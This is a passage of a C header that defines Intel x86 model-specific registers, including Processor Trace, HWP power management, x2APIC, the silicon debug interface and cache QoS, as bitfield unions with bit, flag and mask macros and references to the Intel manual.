     * the ToPA PMI has been handled. If PendTopaPMI = 1 and InjectPsbPmiOnEnable = 1 when
     * IA32_RTIT_CTL.TraceEn[0] transitions from 0 to 1, a PMI will be pended.
     *
     * @remarks If CPUID.(EAX=14H, ECX=0):EBX.INJECTPSBPMI[6] = 1
     * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA) | ToPA PMI)]
     */
    UINT64 PendTopaPmi : 1;
#define IA32_RTIT_STATUS_PEND_TOPA_PMI_BIT 7
#define IA32_RTIT_STATUS_PEND_TOPA_PMI_FLAG 0x80
#define IA32_RTIT_STATUS_PEND_TOPA_PMI_MASK 0x01
#define IA32_RTIT_STATUS_PEND_TOPA_PMI(_) (((_) >> 7) & 0x01)
    UINT64 Reserved2 : 24;

    /**
     * @brief PacketByteCnt
     *
     * [Bits 48:32] This field is written by the processor, and holds a count of packet bytes that
     * have been sent out. The processor also uses this field to determine when the next PSB packet
     * should be inserted. Note that the processor may clear or modify this field at any time while
     * IA32_RTIT_CTL.TraceEn=1. It will have a stable value when IA32_RTIT_CTL.TraceEn=0.
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[1] > 3)
     * @see Vol3C[35.4.2.17(Packet Stream Boundary (PSB) Packet)]
     */
    UINT64 PacketByteCount : 17;
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT_BIT 32
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT_FLAG 0x1FFFF00000000
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT_MASK 0x1FFFF
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT(_) (((_) >> 32) & 0x1FFFF)
    UINT64 Reserved3 : 15;
  };

  UINT64 Flags;
} IA32_RTIT_STATUS_REGISTER;

/**
 * @brief Trace Filter CR3 Match Register <b>(R/W)</b>
 *
 * The IA32_RTIT_CR3_MATCH register is compared against CR3 when IA32_RTIT_CTL.CR3Filter is 1. Bits
 * 63:5 hold the CR3 address value to match, bits 4:0 are reserved to 0.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1)
 * @see Vol3C[35.2.4.2(Filtering by CR3)]
 * @see Vol3C[35.2.7.6(IA32_RTIT_CR3_MATCH MSR)] (reference)
 */
#define IA32_RTIT_CR3_MATCH 0x00000572
typedef union {
  struct {
    UINT64 Reserved1 : 5;

    /**
     * [Bits 63:5] CR3[63:5] value to match.
     */
    UINT64 Cr3ValueToMatch : 59;
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH_BIT 5
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH_FLAG 0xFFFFFFFFFFFFFFE0
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH_MASK 0x7FFFFFFFFFFFFFF
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH(_) (((_) >> 5) & 0x7FFFFFFFFFFFFFF)
  };

  UINT64 Flags;
} IA32_RTIT_CR3_MATCH_REGISTER;

/**
 * @defgroup IA32_RTIT_ADDR \
 *           IA32_RTIT_ADDR(x)
 *
 * The role of the IA32_RTIT_ADDRn_A/B register pairs, for each n, is determined by the
 * corresponding ADDRn_CFG fields in IA32_RTIT_CTL. The number of these register pairs is enumerated
 * by CPUID.(EAX=14H, ECX=1):EAX.RANGECNT[2:0].
 *
 * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > n)
 * @see Vol3C[35.2.7.2(IA32_RTIT_CTL MSR)]
 * @see Vol3C[35.2.7.5(IA32_RTIT_ADDRn_A and IA32_RTIT_ADDRn_B MSRs)] (reference)
 * @{
 */
/**
 * @defgroup IA32_RTIT_ADDR_A \
 *           IA32_RTIT_ADDR(n)_A
 *
 * Region n Start Address.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > n)
 * @{
 */
#define IA32_RTIT_ADDR0_A 0x00000580
#define IA32_RTIT_ADDR1_A 0x00000582
#define IA32_RTIT_ADDR2_A 0x00000584
#define IA32_RTIT_ADDR3_A 0x00000586
/**
 * @}
 */

/**
 * @defgroup IA32_RTIT_ADDR_B \
 *           IA32_RTIT_ADDR(n)_B
 *
 * Region n End Address.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > n)
 * @{
 */
#define IA32_RTIT_ADDR0_B 0x00000581
#define IA32_RTIT_ADDR1_B 0x00000583
#define IA32_RTIT_ADDR2_B 0x00000585
#define IA32_RTIT_ADDR3_B 0x00000587
/**
 * @}
 */

typedef union {
  struct {
    /**
     * [Bits 47:0] Virtual Address.
     */
    UINT64 VirtualAddress : 48;
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS_BIT 0
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS_FLAG 0xFFFFFFFFFFFF
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS_MASK 0xFFFFFFFFFFFF
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS(_) (((_) >> 0) & 0xFFFFFFFFFFFF)

    /**
     * [Bits 63:48] SignExt_VA.
     */
    UINT64 SignExtVa : 16;
#define IA32_RTIT_ADDR_SIGN_EXT_VA_BIT 48
#define IA32_RTIT_ADDR_SIGN_EXT_VA_FLAG 0xFFFF000000000000
#define IA32_RTIT_ADDR_SIGN_EXT_VA_MASK 0xFFFF
#define IA32_RTIT_ADDR_SIGN_EXT_VA(_) (((_) >> 48) & 0xFFFF)
  };

  UINT64 Flags;
} IA32_RTIT_ADDR_REGISTER;

/**
 * @}
 */

/**
 * DS Save Area. Points to the linear address of the first byte of the DS buffer management area,
 * which is used to manage the BTS and PEBS buffers. Returns:
 * - [63:0] The linear address of the first byte of the DS buffer management area, if IA-32e mode is
 * active.
 * - [31:0] The linear address of the first byte of the DS buffer management area, if not in IA-32e
 * mode.
 * - [63:32] Reserved if not in IA-32e mode.
 *
 * @remarks If CPUID.01H:EDX.DS[21] = 1
 * @see Vol3B[18.6.3.4(Debug Store (DS) Mechanism)]
 */
#define IA32_DS_AREA 0x00000600

/**
 * TSC Target of Local APIC's TSC Deadline Mode.
 *
 * @remarks If CPUID.01H:ECX.[24] = 1
 */
#define IA32_TSC_DEADLINE 0x000006E0

/**
 * Enable/disable HWP.
 *
 * @remarks If CPUID.06H:EAX.[7] = 1
 */
#define IA32_PM_ENABLE 0x00000770
typedef union {
  struct {
    /**
     * [Bit 0] HWP_ENABLE.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.2(Enabling HWP)]
     */
    UINT64 HwpEnable : 1;
#define IA32_PM_ENABLE_HWP_ENABLE_BIT 0
#define IA32_PM_ENABLE_HWP_ENABLE_FLAG 0x01
#define IA32_PM_ENABLE_HWP_ENABLE_MASK 0x01
#define IA32_PM_ENABLE_HWP_ENABLE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 63;
  };

  UINT64 Flags;
} IA32_PM_ENABLE_REGISTER;

/**
 * HWP Performance Range Enumeration.
 *
 * @remarks If CPUID.06H:EAX.[7] = 1
 */
#define IA32_HWP_CAPABILITIES 0x00000771
typedef union {
  struct {
    /**
     * [Bits 7:0] Highest_Performance.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
     */
    UINT64 HighestPerformance : 8;
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE_BIT 0
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE_FLAG 0xFF
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE_MASK 0xFF
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE(_) (((_) >> 0) & 0xFF)

    /**
     * [Bits 15:8] Guaranteed_Performance.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
     */
    UINT64 GuaranteedPerformance : 8;
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE_BIT 8
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE_FLAG 0xFF00
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE_MASK 0xFF
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE(_) (((_) >> 8) & 0xFF)

    /**
     * [Bits 23:16] Most_Efficient_Performance.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
     */
    UINT64 MostEfficientPerformance : 8;
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE_BIT 16
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE_FLAG 0xFF0000
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE_MASK 0xFF
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE(_) (((_) >> 16) & 0xFF)

    /**
     * [Bits 31:24] Lowest_Performance.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
     */
    UINT64 LowestPerformance : 8;
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE_BIT 24
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE_FLAG 0xFF000000
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE_MASK 0xFF
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE(_) (((_) >> 24) & 0xFF)
    UINT64 Reserved1 : 32;
  };

  UINT64 Flags;
} IA32_HWP_CAPABILITIES_REGISTER;

/**
 * Power Management Control Hints for All Logical Processors in a Package.
 *
 * @remarks If CPUID.06H:EAX.[11] = 1
 */
#define IA32_HWP_REQUEST_PKG 0x00000772
typedef union {
  struct {
    /**
     * [Bits 7:0] Minimum_Performance.
     *
     * @remarks If CPUID.06H:EAX.[11] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 MinimumPerformance : 8;
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE_BIT 0
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE_FLAG 0xFF
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE_MASK 0xFF
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE(_) (((_) >> 0) & 0xFF)

    /**
     * [Bits 15:8] Maximum_Performance.
     *
     * @remarks If CPUID.06H:EAX.[11] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 MaximumPerformance : 8;
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE_BIT 8
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE_FLAG 0xFF00
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE_MASK 0xFF
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE(_) (((_) >> 8) & 0xFF)

    /**
     * [Bits 23:16] Desired_Performance.
     *
     * @remarks If CPUID.06H:EAX.[11] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 DesiredPerformance : 8;
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE_BIT 16
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE_FLAG 0xFF0000
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE_MASK 0xFF
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE(_) (((_) >> 16) & 0xFF)

    /**
     * [Bits 31:24] Energy_Performance_Preference.
     *
     * @remarks If CPUID.06H:EAX.[11] = 1 && CPUID.06H:EAX.[10] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 EnergyPerformancePreference : 8;
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE_BIT 24
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE_FLAG 0xFF000000
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE_MASK 0xFF
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE(_) (((_) >> 24) & 0xFF)

    /**
     * [Bits 41:32] Activity_Window.
     *
     * @remarks If CPUID.06H:EAX.[11] = 1 && CPUID.06H:EAX.[9] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 ActivityWindow : 10;
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW_BIT 32
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW_FLAG 0x3FF00000000
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW_MASK 0x3FF
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW(_) (((_) >> 32) & 0x3FF)
    UINT64 Reserved1 : 22;
  };

  UINT64 Flags;
} IA32_HWP_REQUEST_PKG_REGISTER;

/**
 * Control HWP Native Interrupts.
 *
 * @remarks If CPUID.06H:EAX.[8] = 1
 */
#define IA32_HWP_INTERRUPT 0x00000773
typedef union {
  struct {
    /**
     * [Bit 0] EN_Guaranteed_Performance_Change.
     *
     * @remarks If CPUID.06H:EAX.[8] = 1
     * @see Vol3B[14.4.6(HWP Notifications)]
     */
    UINT64 EnGuaranteedPerformanceChange : 1;
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE_BIT 0
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE_FLAG 0x01
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE_MASK 0x01
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] EN_Excursion_Minimum.
     *
     * @remarks If CPUID.06H:EAX.[8] = 1
     * @see Vol3B[14.4.6(HWP Notifications)]
     */
    UINT64 EnExcursionMinimum : 1;
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM_BIT 1
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM_FLAG 0x02
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM_MASK 0x01
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM(_) (((_) >> 1) & 0x01)
    UINT64 Reserved1 : 62;
  };

  UINT64 Flags;
} IA32_HWP_INTERRUPT_REGISTER;

/**
 * Power Management Control Hints to a Logical Processor.
 *
 * @remarks If CPUID.06H:EAX.[7] = 1
 */
#define IA32_HWP_REQUEST 0x00000774
typedef union {
  struct {
    /**
     * [Bits 7:0] Minimum_Performance.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 MinimumPerformance : 8;
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE_BIT 0
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE_FLAG 0xFF
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE_MASK 0xFF
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE(_) (((_) >> 0) & 0xFF)

    /**
     * [Bits 15:8] Maximum_Performance.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 MaximumPerformance : 8;
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE_BIT 8
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE_FLAG 0xFF00
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE_MASK 0xFF
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE(_) (((_) >> 8) & 0xFF)

    /**
     * [Bits 23:16] Desired_Performance.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 DesiredPerformance : 8;
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE_BIT 16
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE_FLAG 0xFF0000
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE_MASK 0xFF
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE(_) (((_) >> 16) & 0xFF)

    /**
     * [Bits 31:24] Energy_Performance_Preference.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1 && CPUID.06H:EAX.[10] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 EnergyPerformancePreference : 8;
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE_BIT 24
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE_FLAG 0xFF000000
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE_MASK 0xFF
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE(_) (((_) >> 24) & 0xFF)

    /**
     * [Bits 41:32] Activity_Window.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1 && CPUID.06H:EAX.[9] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 ActivityWindow : 10;
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW_BIT 32
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW_FLAG 0x3FF00000000
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW_MASK 0x3FF
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW(_) (((_) >> 32) & 0x3FF)

    /**
     * [Bit 42] Package_Control.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1 && CPUID.06H:EAX.[11] = 1
     * @see Vol3B[14.4.4(Managing HWP)]
     */
    UINT64 PackageControl : 1;
#define IA32_HWP_REQUEST_PACKAGE_CONTROL_BIT 42
#define IA32_HWP_REQUEST_PACKAGE_CONTROL_FLAG 0x40000000000
#define IA32_HWP_REQUEST_PACKAGE_CONTROL_MASK 0x01
#define IA32_HWP_REQUEST_PACKAGE_CONTROL(_) (((_) >> 42) & 0x01)
    UINT64 Reserved1 : 21;
  };

  UINT64 Flags;
} IA32_HWP_REQUEST_REGISTER;

/**
 * Log bits indicating changes to Guaranteed & excursions to Minimum.
 *
 * @remarks If CPUID.06H:EAX.[7] = 1
 */
#define IA32_HWP_STATUS 0x00000777
typedef union {
  struct {
    /**
     * [Bit 0] Guaranteed_Performance_Change.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.5(HWP Feedback)]
     */
    UINT64 GuaranteedPerformanceChange : 1;
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE_BIT 0
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE_FLAG 0x01
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE_MASK 0x01
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * [Bit 2] Excursion_To_Minimum.
     *
     * @remarks If CPUID.06H:EAX.[7] = 1
     * @see Vol3B[14.4.5(HWP Feedback)]
     */
    UINT64 ExcursionToMinimum : 1;
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM_BIT 2
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM_FLAG 0x04
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM_MASK 0x01
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM(_) (((_) >> 2) & 0x01)
    UINT64 Reserved2 : 61;
  };

  UINT64 Flags;
} IA32_HWP_STATUS_REGISTER;

/**
 * x2APIC ID Register.
 *
 * @remarks If CPUID.01H:ECX[21] = 1 && IA32_APIC_BASE.[10] = 1
 * @see Vol3A[10.12(EXTENDED XAPIC (X2APIC))]
 */
#define IA32_X2APIC_APICID 0x00000802

/**
 * x2APIC Version Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_VERSION 0x00000803

/**
 * x2APIC Task Priority Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_TPR 0x00000808

/**
 * x2APIC Processor Priority Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_PPR 0x0000080A

/**
 * x2APIC EOI Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_EOI 0x0000080B

/**
 * x2APIC Logical Destination Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LDR 0x0000080D

/**
 * x2APIC Spurious Interrupt Vector Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_SIVR 0x0000080F
/**
 * @defgroup IA32_X2APIC_ISR \
 *           IA32_X2APIC_ISR(n)
 *
 * x2APIC In-Service Register Bits (n * 32 + 31):(n * 32).
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 * @{
 */
#define IA32_X2APIC_ISR0 0x00000810
#define IA32_X2APIC_ISR1 0x00000811
#define IA32_X2APIC_ISR2 0x00000812
#define IA32_X2APIC_ISR3 0x00000813
#define IA32_X2APIC_ISR4 0x00000814
#define IA32_X2APIC_ISR5 0x00000815
#define IA32_X2APIC_ISR6 0x00000816
#define IA32_X2APIC_ISR7 0x00000817
/**
 * @}
 */

/**
 * @defgroup IA32_X2APIC_TMR \
 *           IA32_X2APIC_TMR(n)
 *
 * x2APIC Trigger Mode Register Bits (n * 32 + 31):(n * 32).
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 * @{
 */
#define IA32_X2APIC_TMR0 0x00000818
#define IA32_X2APIC_TMR1 0x00000819
#define IA32_X2APIC_TMR2 0x0000081A
#define IA32_X2APIC_TMR3 0x0000081B
#define IA32_X2APIC_TMR4 0x0000081C
#define IA32_X2APIC_TMR5 0x0000081D
#define IA32_X2APIC_TMR6 0x0000081E
#define IA32_X2APIC_TMR7 0x0000081F
/**
 * @}
 */

/**
 * @defgroup IA32_X2APIC_IRR \
 *           IA32_X2APIC_IRR(n)
 *
 * x2APIC Interrupt Request Register Bits (n * 32 + 31):(n * 32).
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 * @{
 */
#define IA32_X2APIC_IRR0 0x00000820
#define IA32_X2APIC_IRR1 0x00000821
#define IA32_X2APIC_IRR2 0x00000822
#define IA32_X2APIC_IRR3 0x00000823
#define IA32_X2APIC_IRR4 0x00000824
#define IA32_X2APIC_IRR5 0x00000825
#define IA32_X2APIC_IRR6 0x00000826
#define IA32_X2APIC_IRR7 0x00000827
/**
 * @}
 */

/**
 * x2APIC Error Status Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_ESR 0x00000828

/**
 * x2APIC LVT Corrected Machine Check Interrupt Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LVT_CMCI 0x0000082F

/**
 * x2APIC Interrupt Command Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_ICR 0x00000830

/**
 * x2APIC LVT Timer Interrupt Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LVT_TIMER 0x00000832

/**
 * x2APIC LVT Thermal Sensor Interrupt Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LVT_THERMAL 0x00000833

/**
 * x2APIC LVT Performance Monitor Interrupt Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LVT_PMI 0x00000834

/**
 * x2APIC LVT LINT0 Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LVT_LINT0 0x00000835

/**
 * x2APIC LVT LINT1 Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LVT_LINT1 0x00000836

/**
 * x2APIC LVT Error Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_LVT_ERROR 0x00000837

/**
 * x2APIC Initial Count Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_INIT_COUNT 0x00000838

/**
 * x2APIC Current Count Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_CUR_COUNT 0x00000839

/**
 * x2APIC Divide Configuration Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_DIV_CONF 0x0000083E

/**
 * x2APIC Self IPI Register.
 *
 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
 */
#define IA32_X2APIC_SELF_IPI 0x0000083F

/**
 * Silicon Debug Feature Control.
 *
 * @remarks If CPUID.01H:ECX.[11] = 1
 */
#define IA32_DEBUG_INTERFACE 0x00000C80
typedef union {
  struct {
    /**
     * @brief Enable <b>(R/W)</b>
     *
     * [Bit 0] BIOS set 1 to enable Silicon debug features. Default is 0.
     *
     * @remarks If CPUID.01H:ECX.[11] = 1
     */
    UINT64 Enable : 1;
#define IA32_DEBUG_INTERFACE_ENABLE_BIT 0
#define IA32_DEBUG_INTERFACE_ENABLE_FLAG 0x01
#define IA32_DEBUG_INTERFACE_ENABLE_MASK 0x01
#define IA32_DEBUG_INTERFACE_ENABLE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 29;

    /**
     * @brief Lock <b>(R/W)</b>
     *
     * [Bit 30] If 1, locks any further change to the MSR. The lock bit is set automatically on the
     * first SMI assertion even if not explicitly set by BIOS. Default is 0.
     *
     * @remarks If CPUID.01H:ECX.[11] = 1
     */
    UINT64 Lock : 1;
#define IA32_DEBUG_INTERFACE_LOCK_BIT 30
#define IA32_DEBUG_INTERFACE_LOCK_FLAG 0x40000000
#define IA32_DEBUG_INTERFACE_LOCK_MASK 0x01
#define IA32_DEBUG_INTERFACE_LOCK(_) (((_) >> 30) & 0x01)

    /**
     * @brief Debug Occurred <b>(R/O)</b>
     *
     * [Bit 31] This "sticky bit" is set by hardware to indicate the status of bit 0. Default is 0.
     *
     * @remarks If CPUID.01H:ECX.[11] = 1
     */
    UINT64 DebugOccurred : 1;
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED_BIT 31
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED_FLAG 0x80000000
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED_MASK 0x01
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED(_) (((_) >> 31) & 0x01)
    UINT64 Reserved2 : 32;
  };

  UINT64 Flags;
} IA32_DEBUG_INTERFACE_REGISTER;

/**
 * L3 QOS Configuration.
 *
 * @remarks If ( CPUID.(EAX=10H, ECX=1):ECX.[2] = 1 )
 */
#define IA32_L3_QOS_CFG 0x00000C81
typedef union {
  struct {
    /**
     * @brief Enable <b>(R/W)</b>
     *
     * [Bit 0] Set 1 to enable L3 CAT masks and COS to operate in Code and Data Prioritization (CDP)
     * mode.
     */
    UINT64 Enable : 1;
#define IA32_L3_QOS_CFG_ENABLE_BIT 0
#define IA32_L3_QOS_CFG_ENABLE_FLAG 0x01
#define IA32_L3_QOS_CFG_ENABLE_MASK 0x01
#define IA32_L3_QOS_CFG_ENABLE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 63;
  };

  UINT64 Flags;
} IA32_L3_QOS_CFG_REGISTER;

/**
 * L2 QOS Configuration.
 *
 * @remarks If ( CPUID.(EAX=10H, ECX=2):ECX.[2] = 1 )
 */
#define IA32_L2_QOS_CFG 0x00000C82
typedef union {
  struct {
    /**
     * @brief Enable <b>(R/W)</b>
     *
     * [Bit 0] Set 1 to enable L2 CAT masks and COS to operate in Code and Data Prioritization (CDP)
     * mode.
     */
    UINT64 Enable : 1;
#define IA32_L2_QOS_CFG_ENABLE_BIT 0
#define IA32_L2_QOS_CFG_ENABLE_FLAG 0x01
#define IA32_L2_QOS_CFG_ENABLE_MASK 0x01
#define IA32_L2_QOS_CFG_ENABLE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 63;
  };

  UINT64 Flags;
} IA32_L2_QOS_CFG_REGISTER;

/**
 * Monitoring Event Select Register.
 *
 * @remarks If ( CPUID.(EAX=07H, ECX=0):EBX.[12] = 1 )
 */
#define IA32_QM_EVTSEL 0x00000C8D
typedef union {
  struct {
    /**
     * @brief Event ID
     *
     * [Bits 7:0] ID of a supported monitoring event to report via IA32_QM_CTR.
     */
    UINT64 EventId : 8;
#define IA32_QM_EVTSEL_EVENT_ID_BIT 0
#define IA32_QM_EVTSEL_EVENT_ID_FLAG 0xFF
#define IA32_QM_EVTSEL_EVENT_ID_MASK 0xFF
#define IA32_QM_EVTSEL_EVENT_ID(_) (((_) >> 0) & 0xFF)
    UINT64 Reserved1 : 24;

    /**
